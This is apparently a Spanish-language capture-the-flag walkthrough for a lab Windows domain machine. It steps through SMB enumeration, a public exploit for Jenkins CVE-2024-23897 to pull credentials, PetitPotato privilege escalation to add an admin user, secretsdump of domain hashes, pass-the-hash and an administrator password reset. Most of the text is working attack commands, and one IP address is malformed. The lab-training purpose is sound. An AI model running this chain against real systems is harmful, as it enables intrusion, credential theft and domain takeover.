Haremos el escaneo de nmap:
![[Pasted image 20240701172021.png]]
Vemos el dominio chimichurri.thl:
![[Pasted image 20240701171941.png]]
Intentamos enumerar el puerto 445 los recursos compartidos, aunque no tengamos credenciales:
```bash
smbmap -H 192.168.200.4 -u test
smbclient -L 192.168.200.4
```
Y vemos un recurso compartido llamado drogas:
![[Pasted image 20240701172340.png]]
Entramos al recurso compartido y nos descargamos el archivo de su interior:
```bash
smbclient -N //192.168.200.4/Drogas
```
![[Pasted image 20240701172436.png]]
En el puerto 6969 vemos un jenkins:
![[Pasted image 20240701172547.png]]
Revisamos la vwersión de jenkins y estamos ante la 2.361.4:
```bash
whatweb http://192.168.200.4:6969/
```
![[Pasted image 20240701172630.png]]
Podemos usar el siguiente exploit, ya que estamos ante la vulnerabilidad CVE-2024-23897:
```bash
https://github.com/godylockz/CVE-2024-23897
```
Probamos el exploit de la siguiente forma y funciona:
```python
python3 exploit.py -u http://192.168.200.4:6969
```
![[Pasted image 20240701173115.png]]
Y obtenemos la siguiente contraseña:
```bash
hacker:Perico69
```
Accedemos por winrm:
```bash
evil-winrm -i chimichurri.thl -u hacker -p 'Perico69'
```
![[Pasted image 20240701173241.png]]
Una vez dentro, ejecutamos el comando whoami /priv:
```bash
whoami /priv
```

Para la escalada, usaremos este exploit:
```bash
https://github.com/wh0amitz/PetitPotato/releases
```

Lo compartimos con la máquina y ejecutamos este comando para crear un usuario:
```bash
.\PetitPotato.exe 3 "net user pingu Password1 /add"
```

Y después tenemos que añadir este usuario al grupo de administradores:
```bash
.\PetitPotato.exe 3 "net localgroup Administradores pingu /add"
```

Y una vez añadido accedemos por winrm:
```bash
evil-winrm -i chimichurri.thl -u pingu -p 'Password1'
```

Una vez visto que tenemos acceso con este usuario, usamos impacket-secretsdump para dumpear los hashes del dominio:
```bash
impacket-secretsdump chimichurri.thl/pingu@192.168.0.200.4
```

Y ahora usamos el hash del administrador para acceder mediante pass the hash:
```bash
evil-winrm -i chimichurri.thl -u Administrador -H hash
```

Tenemos acceso pero vemos que no podemos leer la flag de root, por lo que vamos a cambiar la contraseña del usuario administrador:
```bash
net user Administrador Pepino123 /domain
```

Y ahora con evil-winrm ya podremos entrar como administrador:
```bash
evil-winrm -i chimichurri.thl -u Administrador -p 'Pepino123'
```